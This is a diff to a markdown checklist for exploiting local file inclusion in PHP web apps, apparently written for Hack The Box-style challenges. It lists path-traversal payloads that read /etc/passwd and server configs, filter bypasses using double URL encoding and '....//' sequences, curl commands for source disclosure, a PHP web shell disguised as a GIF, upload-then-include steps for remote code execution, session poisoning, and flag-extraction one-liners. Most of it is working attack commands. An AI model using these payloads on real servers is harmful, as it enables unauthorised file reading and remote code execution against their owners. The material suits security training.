@@ -20,6 +20,9 @@
 - [ ] Try path traversal: `?language=../../../../etc/passwd`
 - [ ] Try with approved prefix: `?language=languages/../../../../etc/passwd`
 - [ ] Confirm content appears in page — check between expected HTML tags
+- [ ] **Determine LFI function:** read the PHP source (see Source Disclosure section)
+  - `file_get_contents()` / `readfile()` → read-only; pivot to source disclosure
+  - `include()` / `require()` → executes PHP; proceed to RCE techniques
 
 ---
 
@@ -28,12 +31,37 @@
 - [ ] Non-recursive removal bypass: `?language=....//....//....//....//etc/passwd`
 - [ ] URL encoded: `?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
 - [ ] Double URL encoded: `?language=%252e%252e%252f...`
+  - Use when filter checks `$_GET["param"]` (PHP-decoded) then calls `urldecode()` after
+  - `%252F` → PHP decodes to `%2F` in `$_GET` → filter sees no `/` → passes → `urldecode()` → `/`
 - [ ] Approved path + non-recursive: `?language=languages/....//....//....//....//etc/passwd`
 - [ ] If extension appended → try `php://filter` or null byte (old PHP)
 
 ---
 
-## PHP Filters (Source Code Disclosure)
+## Source Disclosure via Read-Only LFI
+
+Use when LFI function is `file_get_contents()` / `readfile()` — PHP source is returned as raw text.
+
+- [ ] Read all PHP files in the app to find `include()`/`require()` with user-controlled params:
+  ```bash
+  curl -s "http://<TARGET>/api/image.php?p=....//index.php"
+  curl -s "http://<TARGET>/api/image.php?p=....//contact.php"
+  curl -s "http://<TARGET>/api/image.php?p=....//api/application.php"
+  # Repeat for every .php file found
+  ```
+- [ ] Read webserver config — reveals denied dirs, upload paths, PHP version:
+  ```bash
+  curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/nginx/sites-enabled/default"
+  curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/apache2/apache2.conf"
+  ```
+- [ ] In upload handler source, check how files are named:
+  - `md5_file($tmp_name)` → compute locally: `md5sum /tmp/shell.ext`
+  - Original filename → use that in LFI path
+  - Check if `include()` appends `.php` — if so, omit extension from traversal
+
+---
+
+## PHP Filters (Source Code Disclosure via php://filter)
 
 - [ ] Fuzz for PHP files: `ffuf -w directory-list-2.3-small.txt:FUZZ -u URL/FUZZ.php -mc 200,301,302,403`
 - [ ] Read PHP source via base64 filter (omit .php from resource name):
@@ -83,10 +111,19 @@
 
 ## LFI + File Upload
 
-- [ ] Find upload form: `curl -s http://<TARGET>/settings.php | grep -i "input\|form\|name="`
-- [ ] Create malicious image: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif`
+- [ ] Find upload form and field name: `curl -s http://<TARGET>/apply.php | grep -i "input\|form\|name="`
+- [ ] Read upload handler source to determine file naming scheme (see Source Disclosure above)
+- [ ] Create malicious image (GIF8 bypasses content-type checks):
+  ```bash
+  echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif
+  # Or use .php extension if accepted: > /tmp/shell.php
+  ```
 - [ ] Upload: `curl -s -F "<FIELDNAME>=@/tmp/shell.gif" "http://<TARGET>/upload.php"`
-- [ ] Identify upload path from response HTML (inspect `<img src="...">`)
+- [ ] Determine uploaded filename on server:
+  - If `md5_file()`: `md5sum /tmp/shell.gif` → filename is `<hash>.gif`
+  - If original name preserved: filename is `shell.gif`
+  - If from response HTML: inspect `<img src="...">` or redirect URL
+- [ ] If `include()` appends `.php`: use hash/name WITHOUT extension in LFI path
 - [ ] Include via LFI: `?language=./profile_images/shell.gif&cmd=id`
 - [ ] Confirm `GIF8uid=` in response (GIF magic bytes prepend the output)
 
@@ -154,18 +191,22 @@
 ## Output Extraction
 
 ```bash
-# Flag in page HTML (between known tags)
-python3 -c "import sys,re; print(re.findall(r'Containers</h2>(.*?)<p', sys.stdin.read(), re.S))"
+# Flag in page HTML (between known tags — adapt tag to target app)
+curl -s "URL?cmd=cat+/flag.txt" | python3 -c "import sys,re; print(re.findall(r'<p>\s*(.*?)\s*</p>', sys.stdin.read(), re.S))"
 
-# Flag with HTB format
-grep -oP 'HTB\{[^}]+\}'
+# Flag with HTB format (any position in response)
+curl -s "URL?cmd=cat+/flag.txt" | grep -oP 'HTB\{[^}]+\}'
 
-# Flag with GIF magic bytes prefix (upload+LFI)
-grep -oP 'GIF8\K.*'
+# GIF8 magic bytes prefix (upload+LFI output) — stop at whitespace/HTML
+curl -s "URL?cmd=id" | grep -oP 'GIF8\K[^\s<]+'
 
-# Session content extraction (cmd output embedded before session data)
-python3 -c "import sys,re; print(re.findall(r'Containers</h2>(.*?)<p', sys.stdin.read(), re.S))"
-# Look for output BEFORE the session serialization format (selected_language|s:N:"...")
+# Session poisoning output — cmd result embedded inside serialized session string
+# Output appears before: selected_language|s:N:"...cmd_output...";
+curl -s "URL?language=/var/lib/php/sessions/sess_$SESSID&cmd=id" \
+  | grep -oP 'uid=\d+\(\w+\)'
+
+# Always ls / first — flags are never reliably named flag.txt
+curl -s "URL?cmd=ls+/" | grep -oP '(?<=GIF8)[^\n<]+'
 ```
 
 ---
@@ -182,3 +223,4 @@ python3 -c "import sys,re; print(re.findall(r'Containers</h2>(.*?)<p', sys.stdin
 | `data://` blocked | Try `php://input` instead |
 | RFI connection refused | HTTP server not running — start it before attempting RFI |
 | Upload LFI no output | File path wrong — check response HTML for `<img src="...">` |
+| LFI is `file_get_contents()` but need RCE | Pivot: read all PHP source files to find `include()` LFI; read upload handler to understand file naming |
